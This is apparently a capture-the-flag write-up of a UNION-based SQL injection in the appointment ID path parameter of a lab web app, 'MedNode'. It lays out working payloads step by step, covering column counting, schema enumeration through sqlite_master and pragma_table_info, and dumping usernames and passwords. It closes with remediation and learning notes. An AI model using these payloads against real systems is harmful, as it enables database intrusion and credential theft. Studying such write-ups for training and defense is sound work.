# MedNode - medode-001 - SQLi in the path? No way...

**Category:** Web / SQL Injection  
**Technique:** UNION-based SQL Injection  
**Database:** SQLite  
**Endpoint:** `POST /api/appointments/:id/cancel`

## Challenge Hint

> SQLi in the path? No way...

## 1. Reconnaissance

Registered a test account and inspected the frontend JavaScript (`patient.js`). Found the cancellation endpoint:

```http
POST /api/appointments/${id}/cancel
```

Created an appointment and cancelled it to observe the API request:

```http
POST /api/appointments/7/cancel
```

The endpoint returned an appointment object in JSON.

## 2. Confirm SQL Injection

Added a single quote to the appointment ID:

```http
POST /api/appointments/7'/cancel
```

Response:

```json
{"error":"unrecognized token: \"'\""}
```

The SQLite parser error indicated that the path value was reaching a SQL query unsafely.

A boolean-style test (`7' OR 1=1 -- -`) also produced a SQLite syntax error, suggesting that the injection point was in a numeric SQL context.

## 3. Determine the Number of Columns

Tested a UNION query with one column:

```sql
0 UNION SELECT NULL --
```

SQLite returned:

```text
SELECTs to the left and right of UNION do not have the same number of result columns
```

Increased the number of `NULL` values to seven:

```sql
0 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --
```

This succeeded and returned an appointment object with seven `null` fields.

**Conclusion:** The original query has seven columns.

## 4. Identify Reflected Columns

Used distinct markers:

```sql
0 UNION SELECT 'A','B','C','D','E','F','G' --
```

The response reflected all markers:

```json
{
  "appointment": {
    "id": "A",
    "doctor_id": "B",
    "patient_id": "C",
    "appointment_date": "D",
    "appointment_time": "E",
    "reason_id": "F",
    "status": "G"
  }
}
```

**Conclusion:** All seven UNION columns are reflected in the API response, enabling in-band data extraction.

## 5. Enumerate SQLite Tables

Queried SQLite metadata:

```sql
0 UNION SELECT group_concat(name,'|'),NULL,NULL,NULL,NULL,NULL,NULL
FROM sqlite_master
WHERE type='table' --
```

Discovered tables:

```text
users
sqlite_sequence
reasons
appointment_requests
appointments
```

## 6. Enumerate the `users` Schema

Queried the table metadata:

```sql
0 UNION SELECT group_concat(name,'|'),NULL,NULL,NULL,NULL,NULL,NULL
FROM pragma_table_info('users') --
```

Columns returned:

```text
id|username|password|role|full_name
```

## 7. Extract User Records and Flag

Used `group_concat()` to combine usernames and password values into the reflected `id` field:

```sql
0 UNION SELECT group_concat(username||':'||password,'|'),NULL,NULL,NULL,NULL,NULL,NULL
FROM users --
```

The response exposed multiple user records. The challenge flag appeared in the password values:

```text
bug{3cceOFzpTZbKCMjO7X94W6VfUIMxowuE}
```

## Flag

```text
bug{3cceOFzpTZbKCMjO7X94W6VfUIMxowuE}
```

## Vulnerability Summary

- **Vulnerable input:** Appointment ID in the URL path
- **Endpoint:** `/api/appointments/:id/cancel`
- **Injection type:** UNION-based SQL injection
- **Database:** SQLite
- **Original query column count:** 7
- **Reflected columns:** 7
- **Impact:** Database schema enumeration and extraction of user records and sensitive values

## Remediation

Use parameterized queries instead of concatenating user-controlled values into SQL:

```python
cursor.execute(
    "SELECT * FROM appointments WHERE id = ?",
    (appointment_id,)
)
```

Additional recommendations:

- Validate appointment IDs as integers.
- Enforce object-level authorization so users can only cancel appointments they own.
- Avoid returning raw database errors to clients.
- Do not store secrets or challenge flags in password fields.
- Store passwords using a strong password-hashing algorithm and never expose password hashes through API responses.

## Learning Notes

1. SQL injection can occur in URL path parameters, not only query parameters or form fields.
2. SQLite error messages can help identify the database engine and query structure.
3. UNION injection requires matching the original query's column count.
4. Distinct marker values help identify reflected columns.
5. SQLite's `sqlite_master` and `pragma_table_info()` expose schema metadata.
6. `group_concat()` can combine multiple rows into a single reflected result.
